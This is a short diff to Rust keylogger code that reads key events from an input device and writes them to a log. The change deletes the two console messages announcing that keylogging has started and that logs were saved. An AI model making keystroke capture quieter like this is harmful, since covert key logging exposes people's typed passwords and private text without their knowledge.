@@ -98,7 +98,6 @@ pub fn run() -> io::Result<()> {
     
     device.set_nonblocking(false)?;
 
-    println!("Debugging Keylogger on: {}", path);
     loop {
         for ev in device.fetch_events()? {
             if let EventSummary::Key(_, raw_key, value) = ev.destructure() {
@@ -176,7 +175,6 @@ pub fn run_with_control(
         }
     }
 
-    println!("[keylogger] Stopped and saved logs to {}", log_path);
     Ok(())
 }
 
